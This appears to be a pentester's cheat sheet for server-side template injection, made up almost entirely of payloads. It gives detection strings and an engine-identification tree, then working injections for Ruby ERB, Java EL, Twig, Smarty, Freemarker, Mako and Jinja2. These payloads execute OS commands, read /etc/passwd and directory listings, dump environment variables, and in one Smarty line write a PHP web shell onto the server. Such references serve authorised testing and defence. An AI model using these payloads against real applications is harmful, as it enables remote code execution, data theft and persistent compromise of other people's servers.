### Identify using strings
```
{{7*7}}
${7*7}
${{7*7}}
#{ 7 * 7 }
<%= 7 * 7 %>
```

### Decision tree (> means no error)
```
${7*7}
│
├─── {{7*7}}
│    │
│    ├─> {{7*'7'}}
│    │   │
│    │   ├─> jinja2
│    │   │
│    │   ├─> twig
│    │   │
│    │   └── unkown
│    │
│    └── not-vulnerable
│
└──> a{*comment*}b
     │
     ├── ${"z".join("ab")}
     │   │
     │   ├──> mako
     │   │
     │   └─── unkown
     │
     └─> smarty
```


### Ruby ERB engine - read files and directories
```
<%= Dir.entries('/') %>
```

### Ruby ERB engine - os command
```
<%= system('<command>') %>
<%= `<command> /` %>
<%= IO.popen('<command> /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('<command>') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('<command>') %><%= @c.readline()%>
```


### Java - retrieve environment variables
```
${T(java.lang.System).getenv()}
```

### Java - os command
```
${T(java.lang.Runtime).getRuntime().exec('<command>')}
```


### Expression language EL - os command
```
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<command>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<command>).start()
```


### Twig - file read 
```
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
```

### Twig - os command (use \x20 or $IFS for blank)
```
{{['<command>']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("<command>")}}
```


### Smarty - os command
```
{php}echo `<command>`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['<command>']); ?>",self::clearConfig())}
```


### Freemarker - os command
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("<command>")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('<command>')}
${"freemarker.template.utility.Execute"?new()("<command>")}
```


### Mako - os command
```
<%
import os
x=os.popen('<command>').read()
%>
${x}
```


### Jinja2 - os command (number 396 will vary depending of the application)
```
{{''.__class__.mro()[1].__subclasses__()[396]('<command>',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('<command>').read()}}
```


### Find more
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  

